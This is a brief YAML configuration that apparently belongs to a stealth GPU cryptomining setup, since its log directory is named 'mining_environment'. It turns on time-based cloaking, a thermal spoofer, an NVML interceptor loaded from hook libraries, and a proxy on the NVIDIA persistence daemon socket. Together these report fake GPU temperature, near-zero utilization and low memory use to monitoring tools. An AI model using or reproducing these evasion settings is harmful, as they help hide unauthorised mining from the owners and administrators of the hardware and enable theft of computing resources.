# GPU Plugins Configuration
plugins:
  time_based_cloaking:
    enabled: true
    work_ms: 800
    sleep_ms: 200
    
  thermal_spoofer:
    enabled: true
    fake_temperature: 50
    add_noise: true
    lib_path: /opt/hooks/libtempspoof.so
    
  nvml_interceptor:
    enabled: true
    fake_utilization: 20
    fake_memory_used: 100
    lib_path: /opt/hooks/libgpuhook.so
    
  nvml_proxy:
    enabled: true
    config:
      fake_utilization: 0
      fake_temperature: 50
      fake_memory_used: 100
      add_noise: true
      auto_start: true
      socket_path: "/var/run/nvidia-persistenced/socket"
    

global:
  log_level: INFO
  enable_monitoring: true
  logs_dir: /app/mining_environment/logs